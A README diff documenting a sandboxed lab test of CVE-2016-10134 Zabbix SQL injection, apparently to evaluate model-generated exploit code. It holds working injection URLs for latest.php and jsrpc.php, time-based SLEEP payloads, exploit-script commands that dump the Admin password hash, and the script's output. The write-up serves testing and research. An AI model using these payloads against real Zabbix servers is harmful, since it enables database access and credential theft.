@@ -1,105 +1,168 @@
 # Vuln2Action-Demo
 This repository contains the demo video for the exploit code to be tested in sandboxed environment.
 The testing has been done using the vulhub platform .
-# CVE-2016-10134 Zabbix SQL Injection Report
+SQl Injection from Vulhub
 
-## 1. Introduction to CVE-2016-10134
 
-This report details the SQL injection vulnerability identified as CVE-2016-10134 affecting Zabbix versions prior to 2.2.14 and 3.0 before 3.0.4. The vulnerability is present in the `latest.php` file and can be exploited via the `toggle_ids` array parameter, allowing remote attackers to execute arbitrary SQL commands. A critical aspect of this vulnerability is its ability to be triggered through `jsrpc.php` without requiring prior authentication.
+Vulnerability ref - 
+https://github.com/vulhub/vulhub/tree/40271304330e5411de114ca578e2507023148358/zabbix/CVE-2016-10134
 
-References:
 
-- https://support.zabbix.com/browse/ZBX-11023
-- https://www.exploit-db.com/exploits/40237
-- https://www.exploit-db.com/exploits/40353
 
-## 2. Environment Setup
+CVE-2016-10134
+SQL injection vulnerability in Zabbix before 2.2.14 and 3.0 before 3.0.4 allows remote attackers to execute arbitrary SQL commands via the toggle_ids array parameter in latest.php.
 
-To reproduce and test the vulnerability, a vulnerable Zabbix environment can be set up using Docker Compose.
 
-1.  Navigate to the `vulhub/zabbix/CVE-2016-10134` directory.
-2.  Execute the following command to start the Zabbix 3.0.3 environment:
-    ```bash
-    docker compose up -d
-    ```
-    This command will spin up the necessary containers including MySQL (database), Zabbix server, Zabbix agent, and the Zabbix web interface. If any containers fail to start due to limited memory, check their status with `docker compose ps` and restart them using `docker compose start`.
 
-## 3. Manual Exploitation
+ Docker & Vulhub Setup
 
-The vulnerability can be manually tested via the Zabbix web interface.
 
-### Method 1: Authenticated SQL Injection via `latest.php`
+Clone the repo : git clone --depth 1 https://github.com/vulhub/vulhub
+Download docker if not present
+Run docker with docker-compose file
 
-1.  **Access Zabbix**: Open a web browser and navigate to `http://your-ip:8080`.
-2.  **Login**: Log in with the guest account (username: `guest`, password: empty).
-3.  **Obtain `zbx_sessionid`**: After logging in, inspect your browser's cookies and locate `zbx_sessionid`. Copy the last 16 characters of this cookie value.
-    ![zbx_sessionid](cid:image_1)
-4.  **Trigger SQL Injection**: Use the copied 16 characters as the `sid` value in the URL. For example, if your `zbx_sessionid` ends with `055e1ffa36164a58`, visit:
-    ```
-    http://your-ip:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
-    ```
-    Upon visiting this URL, you should observe an SQL error message, which indicates a successful SQL injection, revealing the database user (e.g., `root@172.19.0.3`).
-    ![latest.php exploit](cid:image_3)
 
-### Method 2: Unauthenticated SQL Injection via `jsrpc.php`
+ Exploit Validation
 
-This method does not require authentication.
 
-1.  **Trigger SQL Injection**: Visit the following URL directly:
-    ```
-    http://your-ip:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)
-    ```
-    This will also trigger an SQL error revealing the database user, confirming the unauthenticated SQL injection.
-    ![jsrpc.php exploit](cid:image_2)
+Update docker-compose (was outdated)
+Add platform: linux/amd64
+Server
+Agent
 
-The successful injection revealing `root@hostname` (e.g., `root@172.19.0.3`) confirms the vulnerability. From this point, further SQL queries can be crafted to extract more information.
 
-## 4. Automated Exploitation with `CVE-2016-10134_generated.py`
+docker compose up -d
+This should get the docker running by pulling the apis and DB for zabbix
 
-The provided Python script `CVE-2016-10134_generated.py` automates the detection and exploitation of this vulnerability, offering both time-based and error-based blind SQL injection techniques.
 
-### Overview of the Script's Capabilities
+Login to Zabbix
+Use “guest” as username
+Use blank password
+Fetch session id …. They probably use session id in auth for token based auth
 
-The script includes:
 
-- **Authentication**: Automatically logs in to Zabbix using provided credentials (default: `Admin`/`zabbix`) to establish a valid session.
-- **Detection**: Implements time-based and error-based SQLi detection methods for both `latest.php` (authenticated) and `jsrpc.php` (unauthenticated).
-- **Blind Extraction Engine**: A robust engine for character-by-character blind extraction of data from the database using either time-based delays or response length differences.
-- **High-level Extraction Targets**: Functions to extract specific sensitive information, such as:
-  - Database version (`SELECT @@version`)
-  - Current database user (`SELECT user()`)
-  - Current database name (`SELECT database()`)
-  - Zabbix Admin password hash (`SELECT passwd FROM users WHERE alias='Admin'`)
-  - User count and individual user aliases from the `users` table.
-- **Zabbix Version Fingerprinting**: Attempts to determine the Zabbix version from the login page to check if it falls within the known vulnerable range.
 
-### How to Use the Script
+Use session ID for injection
+Session id ->fb41007b792256f5381a37a9883c2b5c
+Use last 16(as mentioned in repo):
+Command : 
+http://ip_address:8080/latest.php?output=ajax&sid=session_id&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
+Result: 
 
-To use the script, you need Python 3 and the `requests` library. You can install `requests` using `pip install requests`.
 
-```bash
-# General usage
-python3 CVE-2016-10134_generated.py --url http://your-ip:8080 [ACTION]
+ 
+Remove setup
+Docker compose down -d
 
-# Example: Detect vulnerability (time-based, most reliable)
-python3 CVE-2016-10134_generated.py --url http://localhost:8080 --detect
 
-# Example: Extract database version
-python3 CVE-2016-10134_generated.py --url http://localhost:8080 --version
 
-# Example: Blind-extract current database user character by character
-python3 CVE-2016-10134_generated.py --url http://localhost:8080 --extract-user
+    3. Exploit Code Testing
+Update docker-compose (was outdated)
+Add platform: linux/amd64
+Server
+Agent
 
-# Example: Blind-extract admin password hash (MD5)
-python3 CVE-2016-10134_generated.py --url http://localhost:8080 --dump-admin-hash
 
-# Example: Run all detection and extraction steps
-python3 CVE-2016-10134_generated.py --url http://localhost:8080 --all
+    2 .  docker compose up -d
+This should get the docker running by pulling the apis and DB for zabbix
 
-# Override default credentials
-python3 CVE-2016-10134_generated.py --url http://localhost:8080 --username MyUser --password MyPassword --all
-```
+    
+ 3 .  Run the exploit script after setup runs on localhost:8080
+           CVE-2016-10134_modified.py
 
-The script provides a comprehensive way to confirm the vulnerability and extract sensitive data from the Zabbix database, demonstrating how user aliases and password hashes can be retrieved after confirming SQL injection. The `dump-admin-hash` action specifically targets the `passwd` field for the `Admin` user in the `users` table.
+	Command : python3 /exploits/CVE-2016-10134_modified.py --url http://localhost:8080 --all
 
-This report summarizes the environment setup, manual exploitation steps leading to `root@hostname` access, and the automated methods provided by the Python script to further extract sensitive information like user aliases and password hashes.
+This command is assuming that you store the CVE exploit file mentioned above in a folder named exploits after pulling the vulhub repo
+
+
+
+Result - 1 (unmodified)
+
+============================================================
+  SUMMARY
+============================================================
+  Zabbix Version: 3.0.3
+  Version Vulnerable: True
+  Sqli Confirmed: False
+============================================================
+
+The reason for no injection was that the target code path was never reached
+The cookie was found thus labelled it vulnerable as that was reusable in latest.php
+The toggle_open_state was not ‘1’ as model was not aware of this from either the description or the CAPEC flows
+Required as per readme:
+
+http://your-ip:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
+
+Can add the toggle_open_state=’1’ and the sid in the params for the request
+Just having toggle_ids is not enough
+
+
+
+
+
+Result - 2 (Updated Payload)
+============================================================
+  DETECTION PHASE
+============================================================
+[*] Sending time-based payload: 1 AND SLEEP(3)-- -
+    Response time: 0.03s (threshold: 2.10s)
+[-] No delay detected — may not be vulnerable or not MySQL
+[*] Sending boolean-based payloads …
+    TRUE  response length: 7285
+    FALSE response length: 7285
+    Difference: 0 bytes
+[-] Responses identical — boolean detection inconclusive
+
+[-] Vulnerability NOT confirmed by any method.
+
+============================================================
+  SUMMARY
+============================================================
+  Zabbix Version: 3.0.3
+  Version Vulnerable: True
+  Sqli Confirmed: False
+============================================================
+
+Did not work because detection checks ae incorrect maybe 
+No this was not the cause
+Or the inject SQL statement is not syntactically correct due to - - - line 
+Fixing the syntax for IN() clause in the sql query for injection 
+1 AND SLEEP(3)-- -   to IF(1=1,SLEEP(3),0)
+
+
+
+
+
+Result - 3 (Updated SQL Syntax)
+============================================================
+  DETECTION PHASE
+============================================================
+[*] jsrpc.php time-based payload: 1 AND SLEEP(3)-- -
+    Response time: 0.04s (threshold: 2.10s)
+[-] No delay via jsrpc.php
+[*] latest.php time-based payload: IF(1=1,SLEEP(3),0)
+    Response time: 3.04s (threshold: 2.10s)
+[+] TIME-BASED SQLi CONFIRMED (via latest.php)
+
+
+Final result 
+============================================================
+  SUMMARY
+============================================================
+  Zabbix Version: 3.0.3
+  Version Vulnerable: True
+  Sqli Confirmed: True
+  Db Version: 5.7.44
+  Db User: root@172.18.0.5
+  Db Name: zabbix
+  Admin Hash: 5fce1b3e34b520afeffb37ce08c7cd66   (MD5)
+  Users:
+    - admin
+    - guest
+============================================================
+
+
+
+
+ 
+
